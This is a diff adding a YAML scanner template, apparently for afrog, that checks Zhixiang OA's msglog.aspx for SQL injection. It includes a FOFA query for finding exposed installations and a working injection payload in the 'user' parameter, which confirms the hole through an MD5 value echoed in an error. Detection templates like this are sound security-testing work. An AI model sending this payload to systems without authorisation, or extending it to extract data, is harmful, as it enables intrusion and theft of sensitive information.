@@ -1,0 +1,23 @@
+id: zhixiang-oa-msglog-aspx-sql-inject
+
+info:
+  name: 致翔OA msglog.aspx SQL注入漏洞
+  author: zan8in
+  severity: high
+  verified: false
+  description: |
+    致翔OA msglog.aspx文件存在SQL注入漏洞，攻击者通过漏洞可获取敏感信息。
+    fofa：app="致翔软件-致翔OA"
+  reference:
+    - https://mp.weixin.qq.com/s/wDiwf3QjUkYfKlOHL8G-Qg
+
+set:
+  randstr: randomLowercase(28)
+  md5str: md5(randstr)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /mainpage/msglog.aspx?user=1'+and+(SELECT+sys.fn_sqlvarbasetostr(HashBytes('MD5',+'{{randstr}}')))%3d1+--
+    expression: response.status == 500 && response.body.bcontains(bytes(md5str))
+expression: r0()
